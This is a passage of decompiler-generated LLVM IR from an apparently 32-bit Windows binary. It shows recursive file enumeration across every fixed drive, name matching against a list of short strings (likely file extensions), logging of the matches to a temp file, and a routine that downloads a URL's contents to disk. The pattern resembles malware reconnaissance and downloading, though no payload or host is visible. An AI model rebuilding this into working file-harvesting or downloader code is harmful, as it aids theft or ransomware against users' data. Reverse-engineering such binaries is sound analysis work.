  %27 = inttoptr i32 %26 to i32*, !insn.addr !894
  store i32 ptrtoint ([3 x i16]* @global_var_425924 to i32), i32* %27, align 4, !insn.addr !894
  %28 = add i32 %esp.0.reload, -16, !insn.addr !895
  %29 = inttoptr i32 %28 to i32*, !insn.addr !895
  store i32 %12, i32* %29, align 4, !insn.addr !895
  %30 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !896
  %31 = icmp eq i32 %30, 0, !insn.addr !897
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !898
  br i1 %31, label %dec_label_pc_408ef0, label %dec_label_pc_408d5c, !insn.addr !898

dec_label_pc_408d5c:                              ; preds = %dec_label_pc_408d46
  %32 = add i32 %esp.0.reload, -20, !insn.addr !899
  %33 = inttoptr i32 %32 to i32*, !insn.addr !899
  store i32 %12, i32* %33, align 4, !insn.addr !899
  %34 = add i32 %esp.0.reload, -28, !insn.addr !900
  %35 = inttoptr i32 %34 to i32*, !insn.addr !900
  store i32 ptrtoint ([6 x i16]* @global_var_425b60 to i32), i32* %35, align 4, !insn.addr !900
  %36 = add i32 %esp.0.reload, -32, !insn.addr !901
  %37 = inttoptr i32 %36 to i32*, !insn.addr !901
  store i32 %13, i32* %37, align 4, !insn.addr !901
  %38 = call i32 (i16*, i16*, ...) @wsprintfW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !902
  %39 = load i8, i8* %stack_var_-8796, align 1, !insn.addr !903
  %40 = and i8 %39, 16, !insn.addr !903
  %41 = icmp eq i8 %40, 0, !insn.addr !903
  br i1 %41, label %dec_label_pc_408d93, label %dec_label_pc_408d83, !insn.addr !904

dec_label_pc_408d83:                              ; preds = %dec_label_pc_408d5c
  %42 = call i32 @function_408cb0(), !insn.addr !905
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !906
  br label %dec_label_pc_408ef0, !insn.addr !906

dec_label_pc_408d93:                              ; preds = %dec_label_pc_408d5c
  %43 = add i32 %esp.0.reload, -24, !insn.addr !907
  %44 = inttoptr i32 %43 to i32*, !insn.addr !907
  store i32 ptrtoint ([5 x i16]* @global_var_425b6c to i32), i32* %33, align 4, !insn.addr !908
  store i32 %12, i32* %44, align 4, !insn.addr !909
  %45 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !910
  %46 = mul i32 %45, 2, !insn.addr !911
  %47 = add i32 %46, %14, !insn.addr !911
  store i32 %47, i32* %35, align 4, !insn.addr !912
  %48 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !913
  %49 = icmp eq i32 %48, 0, !insn.addr !914
  store i32 %34, i32* %esp.1.reg2mem, !insn.addr !915
  br i1 %49, label %dec_label_pc_408e9f, label %dec_label_pc_408db3, !insn.addr !915

dec_label_pc_408db3:                              ; preds = %dec_label_pc_408d93
  store i32 ptrtoint ([5 x i16]* @global_var_425b78 to i32), i32* %37, align 4, !insn.addr !916
  %50 = add i32 %esp.0.reload, -36, !insn.addr !917
  %51 = inttoptr i32 %50 to i32*, !insn.addr !917
  store i32 %12, i32* %51, align 4, !insn.addr !917
  %52 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !918
  %53 = mul i32 %52, 2, !insn.addr !919
  %54 = add i32 %53, %14, !insn.addr !919
  %55 = add i32 %esp.0.reload, -40, !insn.addr !920
  %56 = inttoptr i32 %55 to i32*, !insn.addr !920
  store i32 %54, i32* %56, align 4, !insn.addr !920
  %57 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !921
  %58 = icmp eq i32 %57, 0, !insn.addr !922
  store i32 %55, i32* %esp.1.reg2mem, !insn.addr !923
  br i1 %58, label %dec_label_pc_408e9f, label %dec_label_pc_408dd3, !insn.addr !923

dec_label_pc_408dd3:                              ; preds = %dec_label_pc_408db3
  %59 = add i32 %esp.0.reload, -44, !insn.addr !924
  %60 = inttoptr i32 %59 to i32*, !insn.addr !924
  store i32 ptrtoint ([5 x i16]* @global_var_425b84 to i32), i32* %60, align 4, !insn.addr !924
  %61 = add i32 %esp.0.reload, -48, !insn.addr !925
  %62 = inttoptr i32 %61 to i32*, !insn.addr !925
  store i32 %12, i32* %62, align 4, !insn.addr !925
  %63 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !926
  %64 = mul i32 %63, 2, !insn.addr !927
  %65 = add i32 %64, %14, !insn.addr !927
  %66 = add i32 %esp.0.reload, -52, !insn.addr !928
  %67 = inttoptr i32 %66 to i32*, !insn.addr !928
  store i32 %65, i32* %67, align 4, !insn.addr !928
  %68 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !929
  %69 = icmp eq i32 %68, 0, !insn.addr !930
  store i32 %66, i32* %esp.1.reg2mem, !insn.addr !931
  br i1 %69, label %dec_label_pc_408e9f, label %dec_label_pc_408df3, !insn.addr !931

dec_label_pc_408df3:                              ; preds = %dec_label_pc_408dd3
  %70 = add i32 %esp.0.reload, -56, !insn.addr !932
  %71 = inttoptr i32 %70 to i32*, !insn.addr !932
  store i32 ptrtoint ([6 x i16]* @global_var_425b90 to i32), i32* %71, align 4, !insn.addr !932
  %72 = add i32 %esp.0.reload, -60, !insn.addr !933
  %73 = inttoptr i32 %72 to i32*, !insn.addr !933
  store i32 %12, i32* %73, align 4, !insn.addr !933
  %74 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !934
  %75 = mul i32 %74, 2, !insn.addr !935
  %76 = add i32 %75, %14, !insn.addr !935
  %77 = add i32 %esp.0.reload, -64, !insn.addr !936
  %78 = inttoptr i32 %77 to i32*, !insn.addr !936
  store i32 %76, i32* %78, align 4, !insn.addr !936
  %79 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !937
  %80 = icmp eq i32 %79, 0, !insn.addr !938
  store i32 %77, i32* %esp.1.reg2mem, !insn.addr !939
  br i1 %80, label %dec_label_pc_408e9f, label %dec_label_pc_408e13, !insn.addr !939

dec_label_pc_408e13:                              ; preds = %dec_label_pc_408df3
  %81 = add i32 %esp.0.reload, -68, !insn.addr !940
  %82 = inttoptr i32 %81 to i32*, !insn.addr !940
  store i32 ptrtoint ([6 x i16]* @global_var_425b9c to i32), i32* %82, align 4, !insn.addr !940
  %83 = add i32 %esp.0.reload, -72, !insn.addr !941
  %84 = inttoptr i32 %83 to i32*, !insn.addr !941
  store i32 %12, i32* %84, align 4, !insn.addr !941
  %85 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !942
  %86 = mul i32 %85, 2, !insn.addr !943
  %87 = add i32 %15, %86, !insn.addr !943
  %88 = add i32 %esp.0.reload, -76, !insn.addr !944
  %89 = inttoptr i32 %88 to i32*, !insn.addr !944
  store i32 %87, i32* %89, align 4, !insn.addr !944
  %90 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !945
  %91 = icmp eq i32 %90, 0, !insn.addr !946
  store i32 %88, i32* %esp.1.reg2mem, !insn.addr !947
  br i1 %91, label %dec_label_pc_408e9f, label %dec_label_pc_408e2f, !insn.addr !947

dec_label_pc_408e2f:                              ; preds = %dec_label_pc_408e13
  %92 = add i32 %esp.0.reload, -80, !insn.addr !948
  %93 = inttoptr i32 %92 to i32*, !insn.addr !948
  store i32 ptrtoint ([5 x i16]* @global_var_425b84 to i32), i32* %93, align 4, !insn.addr !948
  %94 = add i32 %esp.0.reload, -84, !insn.addr !949
  %95 = inttoptr i32 %94 to i32*, !insn.addr !949
  store i32 %12, i32* %95, align 4, !insn.addr !949
  %96 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !950
  %97 = mul i32 %96, 2, !insn.addr !951
  %98 = add i32 %97, %14, !insn.addr !951
  %99 = add i32 %esp.0.reload, -88, !insn.addr !952
  %100 = inttoptr i32 %99 to i32*, !insn.addr !952
  store i32 %98, i32* %100, align 4, !insn.addr !952
  %101 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !953
  %102 = icmp eq i32 %101, 0, !insn.addr !954
  store i32 %99, i32* %esp.1.reg2mem, !insn.addr !955
  br i1 %102, label %dec_label_pc_408e9f, label %dec_label_pc_408e4b, !insn.addr !955

dec_label_pc_408e4b:                              ; preds = %dec_label_pc_408e2f
  %103 = add i32 %esp.0.reload, -92, !insn.addr !956
  %104 = inttoptr i32 %103 to i32*, !insn.addr !956
  store i32 ptrtoint ([5 x i16]* @global_var_425ba8 to i32), i32* %104, align 4, !insn.addr !956
  %105 = add i32 %esp.0.reload, -96, !insn.addr !957
  %106 = inttoptr i32 %105 to i32*, !insn.addr !957
  store i32 %12, i32* %106, align 4, !insn.addr !957
  %107 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !958
  %108 = mul i32 %107, 2, !insn.addr !959
  %109 = add i32 %108, %14, !insn.addr !959
  %110 = add i32 %esp.0.reload, -100, !insn.addr !960
  %111 = inttoptr i32 %110 to i32*, !insn.addr !960
  store i32 %109, i32* %111, align 4, !insn.addr !960
  %112 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !961
  %113 = icmp eq i32 %112, 0, !insn.addr !962
  store i32 %110, i32* %esp.1.reg2mem, !insn.addr !963
  br i1 %113, label %dec_label_pc_408e9f, label %dec_label_pc_408e67, !insn.addr !963

dec_label_pc_408e67:                              ; preds = %dec_label_pc_408e4b
  %114 = add i32 %esp.0.reload, -104, !insn.addr !964
  %115 = inttoptr i32 %114 to i32*, !insn.addr !964
  store i32 ptrtoint ([6 x i16]* @global_var_425bb4 to i32), i32* %115, align 4, !insn.addr !964
  %116 = add i32 %esp.0.reload, -108, !insn.addr !965
  %117 = inttoptr i32 %116 to i32*, !insn.addr !965
  store i32 %12, i32* %117, align 4, !insn.addr !965
  %118 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !966
  %119 = mul i32 %118, 2, !insn.addr !967
  %120 = add i32 %119, %14, !insn.addr !967
  %121 = add i32 %esp.0.reload, -112, !insn.addr !968
  %122 = inttoptr i32 %121 to i32*, !insn.addr !968
  store i32 %120, i32* %122, align 4, !insn.addr !968
  %123 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !969
  %124 = icmp eq i32 %123, 0, !insn.addr !970
  store i32 %121, i32* %esp.1.reg2mem, !insn.addr !971
  br i1 %124, label %dec_label_pc_408e9f, label %dec_label_pc_408e83, !insn.addr !971

dec_label_pc_408e83:                              ; preds = %dec_label_pc_408e67
  %125 = add i32 %esp.0.reload, -116, !insn.addr !972
  %126 = inttoptr i32 %125 to i32*, !insn.addr !972
  store i32 ptrtoint ([5 x i16]* @global_var_425bc0 to i32), i32* %126, align 4, !insn.addr !972
  %127 = add i32 %esp.0.reload, -120, !insn.addr !973
  %128 = inttoptr i32 %127 to i32*, !insn.addr !973
  store i32 %12, i32* %128, align 4, !insn.addr !973
  %129 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !974
  %130 = mul i32 %129, 2, !insn.addr !975
  %131 = add i32 %130, %14, !insn.addr !975
  %132 = add i32 %esp.0.reload, -124, !insn.addr !976
  %133 = inttoptr i32 %132 to i32*, !insn.addr !976
  store i32 %131, i32* %133, align 4, !insn.addr !976
  %134 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !977
  %135 = icmp eq i32 %134, 0, !insn.addr !978
  %136 = icmp eq i1 %135, false, !insn.addr !979
  store i32 %132, i32* %esp.1.reg2mem, !insn.addr !979
  store i32 %132, i32* %esp.2.reg2mem, !insn.addr !979
  br i1 %136, label %dec_label_pc_408ef0, label %dec_label_pc_408e9f, !insn.addr !979

dec_label_pc_408e9f:                              ; preds = %dec_label_pc_408e83, %dec_label_pc_408e67, %dec_label_pc_408e4b, %dec_label_pc_408e2f, %dec_label_pc_408e13, %dec_label_pc_408df3, %dec_label_pc_408dd3, %dec_label_pc_408db3, %dec_label_pc_408d93
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %137 = add i32 %esp.1.reload, -4, !insn.addr !980
  %138 = inttoptr i32 %137 to i32*, !insn.addr !980
  store i32 %12, i32* %138, align 4, !insn.addr !980
  %139 = add i32 %esp.1.reload, -8, !insn.addr !981
  %140 = inttoptr i32 %139 to i32*, !insn.addr !981
  store i32 ptrtoint ([4 x i8]* @global_var_425bcc to i32), i32* %140, align 4, !insn.addr !981
  %141 = call i32 (i8*, ...) @_printf(i8* bitcast (i32* @0 to i8*)), !insn.addr !982
  %142 = add i32 %esp.1.reload, -12, !insn.addr !983
  %143 = inttoptr i32 %142 to i32*, !insn.addr !983
  store i32 %13, i32* %143, align 4, !insn.addr !983
  %144 = add i32 %esp.1.reload, -16, !insn.addr !984
  %145 = inttoptr i32 %144 to i32*, !insn.addr !984
  store i32 ptrtoint ([8 x i16]* @global_var_425bd0 to i32), i32* %145, align 4, !insn.addr !984
  %146 = add i32 %esp.1.reload, -20, !insn.addr !985
  %147 = inttoptr i32 %146 to i32*, !insn.addr !985
  store i32 %16, i32* %147, align 4, !insn.addr !985
  %148 = call i32 (i16*, i16*, ...) @wsprintfW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !986
  store i32 %16, i32* %138, align 4, !insn.addr !987
  %149 = call i32 @lstrlenW(i16* bitcast (i32* @0 to i16*)), !insn.addr !988
  store i32 0, i32* %140, align 4, !insn.addr !989
  %150 = mul i32 %149, 2, !insn.addr !990
  store i32 %17, i32* %143, align 4, !insn.addr !991
  store i32 %150, i32* %145, align 4, !insn.addr !992
  store i32 %16, i32* %147, align 4, !insn.addr !993
  %151 = load i32, i32* @global_var_42bf54, align 4, !insn.addr !994
  %152 = add i32 %esp.1.reload, -24, !insn.addr !994
  %153 = inttoptr i32 %152 to i32*, !insn.addr !994
  store i32 %151, i32* %153, align 4, !insn.addr !994
  %154 = call i1 @WriteFile(i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !995
  store i32 %152, i32* %esp.2.reg2mem, !insn.addr !995
  br label %dec_label_pc_408ef0, !insn.addr !995

dec_label_pc_408ef0:                              ; preds = %dec_label_pc_408e9f, %dec_label_pc_408e83, %dec_label_pc_408d83, %dec_label_pc_408d46, %dec_label_pc_408d30
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %155 = add i32 %esp.2.reload, -4, !insn.addr !996
  %156 = inttoptr i32 %155 to i32*, !insn.addr !996
  store i32 %18, i32* %156, align 4, !insn.addr !996
  %157 = add i32 %esp.2.reload, -8, !insn.addr !997
  %158 = inttoptr i32 %157 to i32*, !insn.addr !997
  store i32 %10, i32* %158, align 4, !insn.addr !997
  %159 = call i1 @FindNextFileW(i32* nonnull @0, %_WIN32_FIND_DATAW* bitcast (i32* @0 to %_WIN32_FIND_DATAW*)), !insn.addr !998
  %160 = icmp eq i1 %159, false, !insn.addr !999
  %161 = icmp eq i1 %160, false, !insn.addr !1000
  store i32 %157, i32* %esp.0.reg2mem, !insn.addr !1000
  br i1 %161, label %dec_label_pc_408d30, label %dec_label_pc_408f0b, !insn.addr !1000

dec_label_pc_408f0b:                              ; preds = %dec_label_pc_408ef0
  %162 = add i32 %esp.2.reload, -12, !insn.addr !1001
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1001
  store i32 %10, i32* %163, align 4, !insn.addr !1001
  %164 = call i1 @FindClose(i32* nonnull @0), !insn.addr !1002
  %165 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1003
  ret i32 %165, !insn.addr !1004
}

define i32 @function_408f30() local_unnamed_addr {
dec_label_pc_408f30:
  %esi.1.reg2mem = alloca i32, !insn.addr !1005
  %esi.0.reg2mem = alloca i32, !insn.addr !1005
  %esp.0.reg2mem = alloca i32, !insn.addr !1005
  %stack_var_-556 = alloca i32, align 4
  %stack_var_-540 = alloca i16, align 2
  store i32 260, i32* %stack_var_-556, align 4, !insn.addr !1006
  %0 = call i32 @GetLogicalDriveStringsW(i32 260, i16* nonnull %stack_var_-540), !insn.addr !1007
  %1 = load i16, i16* %stack_var_-540, align 2, !insn.addr !1008
  %2 = icmp eq i16 %1, 0, !insn.addr !1008
  br i1 %2, label %dec_label_pc_408f92, label %dec_label_pc_408f70.preheader, !insn.addr !1009

dec_label_pc_408f70.preheader:                    ; preds = %dec_label_pc_408f30
  %3 = ptrtoint i16* %stack_var_-540 to i32, !insn.addr !1010
  %4 = ptrtoint i32* %stack_var_-556 to i32, !insn.addr !1006
  store i32 %4, i32* %esp.0.reg2mem
  store i32 %3, i32* %esi.0.reg2mem
  br label %dec_label_pc_408f70

dec_label_pc_408f70:                              ; preds = %dec_label_pc_408f70.preheader, %dec_label_pc_408f89
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %5 = add i32 %esp.0.reload, -4, !insn.addr !1011
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1011
  store i32 %esi.0.reload, i32* %6, align 4, !insn.addr !1011
  %7 = call i32 @GetDriveTypeW(i16* bitcast (i32* @0 to i16*)), !insn.addr !1012
  %8 = icmp eq i32 %7, 3, !insn.addr !1013
  %9 = icmp eq i1 %8, false, !insn.addr !1014
  br i1 %9, label %dec_label_pc_408f80.preheader, label %dec_label_pc_408f78, !insn.addr !1014

dec_label_pc_408f78:                              ; preds = %dec_label_pc_408f70
  %10 = call i32 @function_408cb0(), !insn.addr !1015
  br label %dec_label_pc_408f80.preheader, !insn.addr !1016

dec_label_pc_408f80.preheader:                    ; preds = %dec_label_pc_408f70, %dec_label_pc_408f78
  store i32 %esi.0.reload, i32* %esi.1.reg2mem
  br label %dec_label_pc_408f80

dec_label_pc_408f80:                              ; preds = %dec_label_pc_408f80.preheader, %dec_label_pc_408f80
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %11 = add i32 %esi.1.reload, 2, !insn.addr !1017
  %12 = inttoptr i32 %11 to i16*, !insn.addr !1018
  %13 = load i16, i16* %12, align 2, !insn.addr !1018
  %14 = icmp eq i16 %13, 0, !insn.addr !1018
  %15 = icmp eq i1 %14, false, !insn.addr !1019
  store i32 %11, i32* %esi.1.reg2mem, !insn.addr !1019
  br i1 %15, label %dec_label_pc_408f80, label %dec_label_pc_408f89, !insn.addr !1019

dec_label_pc_408f89:                              ; preds = %dec_label_pc_408f80
  %16 = add i32 %esi.1.reload, 4, !insn.addr !1020
  %17 = inttoptr i32 %16 to i16*, !insn.addr !1021
  %18 = load i16, i16* %17, align 2, !insn.addr !1021
  %19 = icmp eq i16 %18, 0, !insn.addr !1021
  %20 = icmp eq i1 %19, false, !insn.addr !1022
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1022
  store i32 %16, i32* %esi.0.reg2mem, !insn.addr !1022
  br i1 %20, label %dec_label_pc_408f70, label %dec_label_pc_408f92, !insn.addr !1022

dec_label_pc_408f92:                              ; preds = %dec_label_pc_408f89, %dec_label_pc_408f30
  %21 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1023
  ret i32 %21, !insn.addr !1024
}

define i32 @function_408fb0() local_unnamed_addr {
dec_label_pc_408fb0:
  %stack_var_-275 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  store i32 0, i32* %stack_var_-276, align 4, !insn.addr !1025
  %0 = call i32* @_memset(i32* nonnull %stack_var_-275, i32 0, i32 259), !insn.addr !1026
  %1 = bitcast i32* %stack_var_-276 to i8*
  %2 = call i32 @GetTempPathA(i32 260, i8* nonnull %1), !insn.addr !1027
  %3 = call i8* @lstrcatA(i8* nonnull %1, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_425be0, i32 0, i32 0)), !insn.addr !1028
  %4 = call i32* @CreateFileA(i8* nonnull %1, i32 1073741824, i32 0, %_SECURITY_ATTRIBUTES* null, i32 2, i32 128, i32* null), !insn.addr !1029
  %5 = ptrtoint i32* %4 to i32, !insn.addr !1029
  store i32 %5, i32* @global_var_42bf54, align 4, !insn.addr !1030
  %6 = call i32 @function_408f30(), !insn.addr !1031
  %7 = load i32, i32* @global_var_42bf54, align 4, !insn.addr !1032
  %8 = inttoptr i32 %7 to i32*, !insn.addr !1033
  %9 = call i1 @CloseHandle(i32* %8), !insn.addr !1033
  %10 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1034
  ret i32 %10, !insn.addr !1035
}

define i32 @function_4098f0() local_unnamed_addr {
dec_label_pc_4098f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1036
  %stack_var_-10016.0.reg2mem = alloca i32, !insn.addr !1036
  %esp.0.reg2mem = alloca i32, !insn.addr !1036
  %stack_var_-10008 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-10028 = alloca i16*, align 4
  %stack_var_-10012 = alloca i32, align 4
  %0 = call i32 @__chkstk(), !insn.addr !1037
  store i32 0, i32* %stack_var_-10012, align 4, !insn.addr !1038
  store i16* null, i16** %stack_var_-10028, align 4, !insn.addr !1039
  %1 = call i32* @InternetOpenW(i16* null, i32 ptrtoint (i32* @0 to i32), i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1040
  %2 = icmp eq i32* %1, null, !insn.addr !1041
  br i1 %2, label %dec_label_pc_40995a, label %dec_label_pc_40993f, !insn.addr !1042

dec_label_pc_40993f:                              ; preds = %dec_label_pc_4098f0
  %3 = ptrtoint i32* %1 to i32, !insn.addr !1040
  store i32 %3, i32* %stack_var_-60, align 4, !insn.addr !1043
  %4 = call i32* @InternetOpenUrlW(i32* nonnull %1, i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1044
  %5 = icmp eq i32* %4, null, !insn.addr !1045
  %6 = icmp eq i1 %5, false, !insn.addr !1046
  br i1 %6, label %dec_label_pc_40996d, label %dec_label_pc_409953, !insn.addr !1046

dec_label_pc_409953:                              ; preds = %dec_label_pc_40993f
  %7 = call i1 @InternetCloseHandle(i32* nonnull %1), !insn.addr !1047
  br label %dec_label_pc_40995a, !insn.addr !1047

dec_label_pc_40995a:                              ; preds = %dec_label_pc_409953, %dec_label_pc_4098f0
  %8 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1048
  ret i32 %8, !insn.addr !1049

dec_label_pc_40996d:                              ; preds = %dec_label_pc_40993f
  %9 = ptrtoint i32* %4 to i32, !insn.addr !1044
  %10 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1043
  %11 = ptrtoint i32* %stack_var_-10012 to i32, !insn.addr !1050
  %12 = ptrtoint i32* %stack_var_-10008 to i32, !insn.addr !1051
  %13 = ptrtoint i16** %stack_var_-10028 to i32
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1052
  store i32 0, i32* %stack_var_-10016.0.reg2mem, !insn.addr !1052
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !1052
  br label %dec_label_pc_409970, !insn.addr !1052

dec_label_pc_409970:                              ; preds = %dec_label_pc_409970, %dec_label_pc_40996d
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %stack_var_-10016.0.reload = load i32, i32* %stack_var_-10016.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1050
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1050
  store i32 %11, i32* %15, align 4, !insn.addr !1050
  %16 = add i32 %esp.0.reload, -8, !insn.addr !1053
  %17 = inttoptr i32 %16 to i32*, !insn.addr !1053
  store i32 10000, i32* %17, align 4, !insn.addr !1053
  %18 = add i32 %esp.0.reload, -12, !insn.addr !1051
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1051
  store i32 %12, i32* %19, align 4, !insn.addr !1051
  %20 = add i32 %esp.0.reload, -16, !insn.addr !1054
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1054
  store i32 %9, i32* %21, align 4, !insn.addr !1054
  %22 = call i1 @InternetReadFile(i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1055
  %23 = load i32, i32* %stack_var_-10012, align 4, !insn.addr !1056
  %24 = add i32 %23, %esi.0.reload, !insn.addr !1057
  %25 = add i32 %esp.0.reload, -20, !insn.addr !1058
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1058
  store i32 %24, i32* %26, align 4, !insn.addr !1058
  %27 = call i32 @"??2@YAPAXI@Z"(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1059
  %28 = add i32 %esp.0.reload, -24, !insn.addr !1060
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1060
  store i32 %esi.0.reload, i32* %29, align 4, !insn.addr !1060
  %30 = add i32 %esp.0.reload, -28, !insn.addr !1061
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1061
  store i32 %stack_var_-10016.0.reload, i32* %31, align 4, !insn.addr !1061
  %32 = add i32 %esp.0.reload, -32, !insn.addr !1062
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1062
  store i32 %27, i32* %33, align 4, !insn.addr !1062
  %34 = call i32 @_memcpy.1(), !insn.addr !1063
  %35 = load i32, i32* %stack_var_-10012, align 4, !insn.addr !1064
  %36 = add i32 %esp.0.reload, -36, !insn.addr !1064
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1064
  store i32 %35, i32* %37, align 4, !insn.addr !1064
  %38 = add i32 %esp.0.reload, -40, !insn.addr !1065
  %39 = inttoptr i32 %38 to i32*
  store i32 %12, i32* %39, align 4, !insn.addr !1065
  %40 = add i32 %27, %esi.0.reload, !insn.addr !1066
  %41 = add i32 %esp.0.reload, -44, !insn.addr !1067
  %42 = inttoptr i32 %41 to i32*
  store i32 %40, i32* %42, align 4, !insn.addr !1067
  %43 = call i32 @_memcpy.1(), !insn.addr !1068
  store i32 0, i32* %26, align 4, !insn.addr !1069
  store i32 %13, i32* %29, align 4, !insn.addr !1070
  %44 = load i32, i32* %stack_var_-10012, align 4, !insn.addr !1071
  store i32 %44, i32* %31, align 4, !insn.addr !1071
  store i32 %12, i32* %33, align 4, !insn.addr !1072
  store i32 0, i32* %37, align 4, !insn.addr !1073
  %45 = call i1 @WriteFile(i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1074
  store i32 %stack_var_-10016.0.reload, i32* %39, align 4, !insn.addr !1075
  call void @_free(i32* nonnull @0), !insn.addr !1076
  %46 = load i32, i32* %stack_var_-10012, align 4, !insn.addr !1077
  %47 = add i32 %46, %esi.0.reload, !insn.addr !1078
  %48 = icmp eq i32 %46, 0, !insn.addr !1079
  %49 = icmp eq i1 %48, false, !insn.addr !1080
  store i32 %36, i32* %esp.0.reg2mem, !insn.addr !1080
  store i32 %27, i32* %stack_var_-10016.0.reg2mem, !insn.addr !1080
  store i32 %47, i32* %esi.0.reg2mem, !insn.addr !1080
  br i1 %49, label %dec_label_pc_409970, label %dec_label_pc_409a02, !insn.addr !1080

dec_label_pc_409a02:                              ; preds = %dec_label_pc_409970
  store i32 %9, i32* %39, align 4, !insn.addr !1081
  %50 = inttoptr i32 %27 to i32*, !insn.addr !1082
  %51 = call i1 @InternetCloseHandle(i32* %50), !insn.addr !1082
  store i32 %3, i32* %42, align 4, !insn.addr !1083
  %52 = call i1 @InternetCloseHandle(i32* nonnull @0), !insn.addr !1084
  %53 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1085
  ret i32 %53, !insn.addr !1086
}

define i32 @function_409a30() local_unnamed_addr {
dec_label_pc_409a30:
  %edi.3.reg2mem = alloca i32, !insn.addr !1087
  %eax.2.reg2mem = alloca i32, !insn.addr !1087
  %edi.2.reg2mem = alloca i32, !insn.addr !1087
  %edi.1.reg2mem = alloca i32, !insn.addr !1087
  %esi.0.reg2mem = alloca i32, !insn.addr !1087
  %ecx.0.reg2mem = alloca i32, !insn.addr !1087
  %edi.0.reg2mem = alloca i32, !insn.addr !1087
  %stack_var_-20.0.reg2mem = alloca i32, !insn.addr !1087
  %ebx.0.reg2mem = alloca i32, !insn.addr !1087
  %0 = call i32 @__decompiler_undefined_function_0()
  br label %dec_label_pc_409a41, !insn.addr !1088

dec_label_pc_409a41:                              ; preds = %dec_label_pc_409a41, %dec_label_pc_409a30
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %1 = inttoptr i32 %ebx.0.reload to i8*, !insn.addr !1089
  %2 = load i8, i8* %1, align 1, !insn.addr !1089
  %3 = add i32 %ebx.0.reload, 1, !insn.addr !1090
  %4 = icmp eq i8 %2, 0, !insn.addr !1091
  %5 = icmp eq i1 %4, false, !insn.addr !1092
  store i32 %3, i32* %ebx.0.reg2mem, !insn.addr !1092
  br i1 %5, label %dec_label_pc_409a41, label %dec_label_pc_409a48, !insn.addr !1092

dec_label_pc_409a48:                              ; preds = %dec_label_pc_409a41
